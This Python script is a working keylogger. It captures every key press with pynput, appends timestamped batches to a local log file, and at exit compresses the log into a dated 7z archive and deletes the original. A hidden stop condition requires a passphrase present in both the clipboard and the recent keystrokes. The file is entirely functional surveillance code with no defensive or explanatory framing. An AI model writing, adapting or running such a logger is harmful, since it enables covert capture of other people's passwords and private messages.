import atexit
import datetime
import os

import py7zr
import pyperclip
from pynput.keyboard import Listener

import passwords


class Logger:
    def __init__(self, strftime_format, clipboard_pass, keyboard_pass):
        self.keys = []
        self.strftime_format = strftime_format
        self.clipboard_pass = clipboard_pass
        self.keyboard_pass = keyboard_pass

    def update_record(self, key):
        if (
            pyperclip.paste().strip() == self.clipboard_pass
            and len(self.keys) >= len(self.keyboard_pass)
            and "".join(self.keys[-len(self.keyboard_pass) :]) == self.keyboard_pass
        ):
            return False

        if len(self.keys) < 100:
            cleaned_key = str(key).strip("'")
            self.keys.append(cleaned_key)
        else:
            self.write_log()

    def write_log(self):
        with open("log.txt", "a") as f:
            data = self.get_date(self.strftime_format) + "\n" + "\n".join(self.keys)
            f.write(data)
        self.keys = []

    def get_date(self, format):
        return datetime.datetime.strftime(datetime.datetime.now(), format)

    def compress(self):
        archive = py7zr.SevenZipFile(
            "log_" + self.get_date("%Y%m%d_%H%M%S") + ".7z", "w"
        )
        archive.write("log.txt")
        archive.close()

    def cleanup(self):
        self.write_log()
        self.compress()
        os.remove("log.txt")


log = Logger("%c", passwords.clipboard_pass, passwords.keyboard_pass)

atexit.register(log.cleanup)

with Listener(on_press=log.update_record) as listener:
    listener.join()
